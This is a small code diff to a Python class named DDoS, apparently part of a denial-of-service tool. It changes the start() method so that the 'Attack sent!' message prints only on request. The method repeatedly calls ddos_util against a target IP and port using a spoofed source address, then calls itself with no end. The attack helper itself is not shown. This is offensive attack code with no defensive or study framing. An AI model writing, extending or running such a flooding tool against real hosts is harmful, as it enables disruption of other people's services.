@@ -27,14 +27,17 @@ class DDoS:
         self.IP = IP
         self.PORT = PORT
      
-    def start(self):
+    def start(self, output=False):
         r"""
         Start DDoS
         -----
+        Parameter :
+        - output: `True/False` | Print DDoS output (Default : False)
         """
 
         for i in range(self.duration):
             ddos_util(IP=self.IP, PORT=self.PORT, fake_ip=self.fake_ip)
-            print("Attack sent!")
-            
+            if output == True:
+                print("Attack sent!")
+                
         self.start()
